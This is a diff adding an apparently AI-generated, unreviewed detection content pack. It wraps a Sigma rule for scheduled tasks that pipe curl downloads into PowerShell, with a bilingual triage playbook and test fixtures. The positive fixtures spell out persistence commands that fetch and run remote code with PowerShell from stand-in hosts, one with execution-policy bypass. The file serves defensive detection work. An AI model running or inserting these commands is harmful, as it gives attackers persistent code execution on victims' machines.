@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "1d174d38-8fda-4081-a9b6-56d9763c0cd8",
+    "title": "Scheduled Task Creation with Curl and PowerShell Execution Combo",
+    "level": "medium",
+    "status": "experimental",
+    "author": "Swachchhanda Shrawan Poudel (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_schtasks_curl_and_powershell_combo.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_schtasks_curl_and_powershell_combo.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1053.005",
+      "T1105",
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó una tarea programada con schtasks.exe cuya acción combina curl para descargar contenido HTTP y PowerShell para ejecutarlo. Este patrón sirve para persistir y ejecutar payloads sin escribir el malware en disco.",
+      "what_it_detects": "Procesos schtasks.exe con ' /create ' (o '-create') en CommandLine que además contienen 'curl ', 'http', '-o' y 'powershell', como en 'curl -o - <url> | powershell' dentro del parámetro /tr.",
+      "why_it_matters": "Un atacante logra persistencia con tareas programadas (T1053.005) y descarga herramientas desde un servidor remoto (T1105). Al canalizar la salida de curl hacia PowerShell, el código se ejecuta en memoria cada vez que se dispara la tarea, a menudo con /rl Highest.",
+      "triage_steps": [
+        "Revise el CommandLine completo: nombre de tarea (/tn), frecuencia (/sc, /mo), nivel (/rl Highest) y la acción /tr con la URL y el pipe hacia powershell.",
+        "Extraiga la URL o dominio, incluso si está ofuscada con variables 'set' y expansión '!var!', y consulte reputación e inteligencia interna.",
+        "Analice ParentImage y la cadena de procesos: cmd con 'start /min', conhost --headless, Office, navegador o script descargado son señales de alerta.",
+        "Identifique al usuario y si tiene privilegios administrativos; confirme con el dueño del equipo si la tarea es esperada.",
+        "Liste la tarea en el host (schtasks /query /tn <nombre> /v) y verifique ejecuciones previas en el historial de Task Scheduler.",
+        "Busque en el mismo host, +/- 15 minutos, procesos hijos de taskeng/svchost que ejecuten curl o powershell y conexiones salientes al dominio.",
+        "Busque la misma URL, nombre de tarea o CommandLine en otros endpoints y alertas previas del mismo usuario o host."
+      ],
+      "false_positives": [
+        "Uso legítimo de schtasks por administradores para tareas de mantenimiento que descargan y ejecutan scripts internos.",
+        "Scripts de automatización en entornos controlados que combinan curl y PowerShell contra repositorios internos conocidos.",
+        "Herramientas de despliegue o RMM que registran tareas con descargas desde dominios corporativos documentados."
+      ],
+      "response_steps": [
+        "Verifique con el administrador o dueño del host si la tarea y la URL son autorizadas antes de actuar.",
+        "Si es maliciosa, aísle el endpoint y bloquee el dominio o IP en proxy, DNS y firewall.",
+        "Exporte la definición de la tarea como evidencia y luego elimínela; capture memoria si es posible.",
+        "Busque otras formas de persistencia (Run keys, servicios, WMI) y rote las credenciales del usuario afectado.",
+        "Escanee el host con EDR, revise movimiento lateral y restaure desde una imagen confiable si hubo compromiso confirmado."
+      ],
+      "severity_rationale": "Nivel medio: la combinación es muy sospechosa, pero algunos administradores y herramientas de automatización usan patrones similares de forma legítima."
+    },
+    "en": {
+      "summary": "A scheduled task was created with schtasks.exe whose action combines curl to fetch HTTP content and PowerShell to run it. This pattern gives persistent, fileless payload execution.",
+      "what_it_detects": "schtasks.exe processes with ' /create ' (or '-create') in CommandLine that also contain 'curl ', 'http', '-o' and 'powershell', such as 'curl -o - <url> | powershell' inside the /tr argument.",
+      "why_it_matters": "Attackers gain persistence through scheduled tasks (T1053.005) and pull tools from a remote server (T1105). Piping curl output into PowerShell runs code in memory every time the task fires, often with /rl Highest.",
+      "triage_steps": [
+        "Read the full CommandLine: task name (/tn), schedule (/sc, /mo), run level (/rl Highest) and the /tr action with the URL and the pipe to powershell.",
+        "Extract the URL or domain, including when obfuscated with 'set' variables and '!var!' expansion, and check reputation and internal intel.",
+        "Review ParentImage and the process chain: cmd with 'start /min', conhost --headless, Office, a browser or a dropped script are red flags.",
+        "Identify the user and their privileges; confirm with the host owner whether the task is expected.",
+        "Query the task on the host (schtasks /query /tn <name> /v) and check Task Scheduler history for prior runs.",
+        "On the same host, +/- 15 minutes, look for curl or powershell children of svchost/taskeng and outbound connections to the domain.",
+        "Hunt for the same URL, task name or CommandLine on other endpoints and in earlier alerts for the same user or host."
+      ],
+      "false_positives": [
+        "Legitimate admin use of schtasks for maintenance tasks that download and run internal scripts.",
+        "Automation scripts in controlled environments combining curl and PowerShell against known internal repositories.",
+        "Deployment or RMM tools registering tasks that download from documented corporate domains."
+      ],
+      "response_steps": [
+        "Confirm with the administrator or host owner whether the task and URL are authorized before acting.",
+        "If malicious, isolate the endpoint and block the domain or IP at proxy, DNS and firewall.",
+        "Export the task definition as evidence, then delete it; capture memory if possible.",
+        "Check for other persistence (Run keys, services, WMI) and rotate the affected user's credentials.",
+        "Run an EDR scan, review lateral movement and rebuild from a trusted image if compromise is confirmed."
+      ],
+      "severity_rationale": "Medium: the combination is highly suspicious, but some administrators and automation tools legitimately use similar patterns."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Hidden schtasks creation running curl output piped into PowerShell every 15 minutes with highest privileges",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\schtasks.exe",
+          "OriginalFileName": "schtasks.exe",
+          "CommandLine": "schtasks /create /tn PolicyConverter /sc minute /mo 15 /tr \"conhost --headless cmd /c curl -o - https://www.example.com/mscu/lokc.php?wl=WS0142 | powershell\" /rl Highest",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd start /min /c schtasks /create /tn PolicyConverter /sc minute /mo 15 /tr \"...\" /rl Highest"
+        }
+      },
+      {
+        "description": "Dash-style -create option with curl downloading a script and powershell.exe executing it",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\schtasks.exe",
+          "CommandLine": "schtasks.exe -create -tn UpdaterSvc -sc onlogon -tr \"cmd /c curl -s -o %TEMP%\\u.ps1 http://198.51.100.23/u.ps1 & powershell.exe -ep bypass -f %TEMP%\\u.ps1\"",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate scheduled task running a local PowerShell backup script, no curl download",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FILE01.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Windows\\System32\\schtasks.exe",
+          "CommandLine": "schtasks /create /tn DailyBackup /sc daily /st 02:00 /tr \"powershell.exe -File C:\\Scripts\\backup.ps1\" /ru SYSTEM",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "Task that downloads a file with curl but never invokes PowerShell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\it_admin",
+          "Image": "C:\\Windows\\System32\\schtasks.exe",
+          "CommandLine": "schtasks /create /tn FetchConfig /sc daily /tr \"curl -o C:\\ProgramData\\Corp\\config.json https://config.example.org/config.json\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
